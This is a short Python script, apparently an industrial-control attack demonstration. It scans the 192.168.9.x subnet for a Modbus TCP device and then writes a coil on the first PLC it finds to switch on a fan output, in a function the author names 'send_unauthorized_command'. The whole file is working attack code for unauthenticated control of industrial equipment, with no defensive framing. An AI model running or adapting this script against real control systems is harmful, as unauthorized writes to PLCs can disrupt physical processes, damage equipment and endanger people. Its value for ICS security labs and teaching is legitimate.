import socket
import pymodbus
from pymodbus.client import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip(subnet):
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        try:
            # Attempt to connect to the Modbus server
            client = ModbusTcpClient(ip)
            if client.connect():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except Exception as e:
            print(f"Error connecting to {ip}: {e}")
    return None

# Function to send an unauthorized command to the PLC
def send_unauthorized_command(plc_ip):
    try:
        client = ModbusTcpClient(plc_ip)
        if client.connect():
            # Write to the Q_FAN output (address 0)
            client.write_coil(0, True)
            print("Fan activated successfully.")
            client.close()
        else:
            print("Failed to connect to the PLC.")
    except Exception as e:
        print(f"Error sending command: {e}")

# Main function
def main():
    subnet = "192.168.9"
    plc_ip = discover_plc_ip(subnet)
    
    if plc_ip:
        send_unauthorized_command(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()